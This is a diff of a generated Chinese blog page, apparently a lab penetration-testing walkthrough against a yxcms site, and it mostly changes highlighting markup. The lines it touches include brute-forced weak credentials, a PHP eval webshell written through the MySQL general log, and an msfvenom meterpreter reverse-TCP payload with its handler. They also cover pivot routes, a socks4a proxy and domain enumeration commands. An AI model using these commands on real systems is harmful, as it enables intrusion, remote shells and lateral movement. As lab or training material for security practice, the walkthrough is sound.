@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -285,8 +285,6 @@
 <p>经过爆破很容易试出密码为<code>123456</code></p>
 <p>成功登录后台</p>
 </li>
-</ul>
-<ul>
 <li><p>尝试搜索网站已发现的漏洞</p>
 <p>这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/162886.html">代码审计| yxcms app 1.4.6 漏洞集合</a></p>
@@ -307,14 +305,14 @@
 <p>直接使用工具爆破，很容易得到，用户名和密码都为<code>root</code></p>
 <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" srcset="/img/loading.gif" alt="image-20210511132208919" style="zoom:50%;">
 
-<p>一开始的想法是利用写<code>into outfile</code>写木马getshell，但是由于网站的<code>secure_file_priv</code>的值为NULL，所以我们不能利用写<code>into outfile</code>写木马getshell</p>
+<p>一开始的想法是利用写<code>into outfile</code>写木马getshell，但是由于网站的<code> secure_file_priv</code>的值为NULL，所以我们不能利用写<code>into outfile</code>写木马getshell</p>
 <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" srcset="/img/loading.gif" alt="image-20210511161606685" style="zoom:50%;">
 
 <p>但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysql日志木马</a></p>
 <p>执行下列命令</p>
-<div class="hljs"><pre><code class="hljs mysql">set global general_log&#x3D;on;                                     #开启日志
-set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;;  #设置指定文件为网站日志存放文件
-SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;               		   #执行该语句，会将该命令写入日志文件</code></pre></div>
+<div class="hljs"><pre><code class="hljs mysql">set global general_log=on;                                     #开启日志
+set global general_log_file=&#x27;C:/phpstudy/www/yxcms/hack.php&#x27;;  #设置指定文件为网站日志存放文件
+SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;               		   #执行该语句，会将该命令写入日志文件</code></pre></div>
 
 <p>执行完命令，便可以在网站根目录下看到<code>hack.php</code></p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" srcset="/img/loading.gif" alt="image-20210511162058801"></p>
@@ -338,7 +336,7 @@ SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;               		  
 <li><p>新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中</p>
 </li>
 </ul>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp lhost=<span class="hljs-number">192.168.74.130</span> lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-number">1</span>.exe</code></pre></div>
+<div class="hljs"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.74.130 <span class="hljs-attribute">lport</span>=4444 -f exe -o 1.exe</code></pre></div>
 
 <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" srcset="/img/loading.gif" alt="image-20210511163917527" style="zoom: 67%;">
 
@@ -346,9 +344,9 @@ SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;               		  
 
 <ul>
 <li><p>再次输入msfconsole 进入应用，输入<code>use exploit/multi/handler</code>进入管理工具，获取shell权限，命令如下</p>
-<div class="hljs"><pre><code class="hljs routeros">use exploit/multi/handler
-<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter_reverse_tcp
-<span class="hljs-builtin-name">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span>
+<div class="hljs"><pre><code class="hljs bash">use exploit/multi/handler
+<span class="hljs-built_in">set</span> payload windows/x64/meterpreter_reverse_tcp
+<span class="hljs-built_in">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span>
 <span class="hljs-string">run</span></code></pre></div>
 
 <p>即可获取shell</p>
@@ -442,10 +440,10 @@ net localgroup administrators hack /<span class="hljs-keyword">add</span></code>
 </ul>
 <p>注：添加路由一定要在挂代理之前，因为代理需要用到路由功能</p>
 <p>在获取<code>shell</code>的机器上添加路由</p>
-<div class="hljs"><pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-builtin-name">run</span> get_local_subnets
-meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -s 192.168.21.0/24
+<div class="hljs"><pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-built_in">run</span> get_local_subnets
+meterpreter &gt; <span class="hljs-built_in">run</span> autoroute -s 192.168.21.0/24
 <span class="hljs-comment"># 添加路由</span>
-meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -p
+meterpreter &gt; <span class="hljs-built_in">run</span> autoroute -p
 <span class="hljs-comment"># 显示路由</span>
 meterpreter &gt;<span class="hljs-built_in"> route </span>flush 
 <span class="hljs-comment"># 删除</span></code></pre></div>
@@ -454,22 +452,22 @@ meterpreter &gt;<span class="hljs-built_in"> route </span>flush
 <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" srcset="/img/loading.gif" alt="image-20210511193307727" style="zoom:67%;">
 
 <p>然后建立<code>socks4</code>代理</p>
-<div class="hljs"><pre><code class="hljs pgsql">meterpreter &gt; background
-msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use auxiliary/<span class="hljs-keyword">server</span>/socks4a
-msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvhost <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
-msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>
-msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run</code></pre></div>
+<div class="hljs"><pre><code class="hljs bash">meterpreter &gt; background
+msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) &gt; <span class="hljs-built_in">set</span> srvhost 127.0.0.1
+msf5 auxiliary(server/socks4a) &gt; <span class="hljs-built_in">set</span> srvport 1080
+msf5 auxiliary(server/socks4a) &gt; run</code></pre></div>
 
 
 
 <p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" srcset="/img/loading.gif" alt="image-20210511195019515"></p>
 <p>设置完代理后攻击者主机就可以访问内网了</p>
-<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><div class="hljs"><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器</span>
-net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>
-net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>
-net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>         <span class="hljs-comment">#查看域内所有的主机名</span>
-net group <span class="hljs-string">&quot;domain admins&quot;</span>   <span class="hljs-string">/domain</span>          <span class="hljs-comment">#查看域管理员</span>
-net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span>       <span class="hljs-comment">#查看域控</span></code></pre></div>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><div class="hljs"><pre><code class="hljs bash">net time /domain        <span class="hljs-comment">#查看时间服务器</span>
+net user /domain        <span class="hljs-comment">#查看域用户</span>
+net view /domain        <span class="hljs-comment">#查看有几个域</span>
+net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain         <span class="hljs-comment">#查看域内所有的主机名</span>
+net group <span class="hljs-string">&quot;domain admins&quot;</span>   /domain          <span class="hljs-comment">#查看域管理员</span>
+net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain       <span class="hljs-comment">#查看域控</span></code></pre></div>
 
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" srcset="/img/loading.gif" alt="image-20210511200502702"></p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" srcset="/img/loading.gif" alt="image-20210511200553874"></p>
